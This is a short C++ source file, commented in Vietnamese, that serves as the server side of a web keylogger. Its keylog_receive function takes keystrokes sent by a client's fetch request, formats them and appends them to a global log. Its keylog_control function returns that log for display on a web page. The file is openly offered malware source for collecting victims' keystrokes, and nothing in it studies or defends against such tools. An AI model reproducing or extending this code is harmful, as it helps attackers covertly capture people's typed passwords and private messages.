#include <iostream>
#include <string>
#include <map>
#include "keylogger.h"

std::string KEY_LOG = "";

// Hàm này trả về nội dung log để hiển thị lên web
std::string keylog_control() {
    if (KEY_LOG.empty()) {
        return "[Empty Log]";
    }
    return KEY_LOG;
}

// Hàm này nhận phím bấm từ fetch request của client
std::string keylog_receive(const std::map<std::string, std::string>& query) {
    if (!query.count("key")) {
        return "No key provided";
    }

    std::string key = query.at("key");

    // Format cho dễ nhìn
    if (key == "Enter") KEY_LOG += "\n";
    else if (key == "Space") KEY_LOG += " ";
    else if (key == "Backspace") {
        if (!KEY_LOG.empty()) KEY_LOG.pop_back();
    }
    else if (key.length() == 1) {
        KEY_LOG += key;
    } else {
        KEY_LOG += "[" + key + "]";
    }

    std::cout << "[KEY_LOG] Current: " << KEY_LOG << std::endl;
    return "OK";
}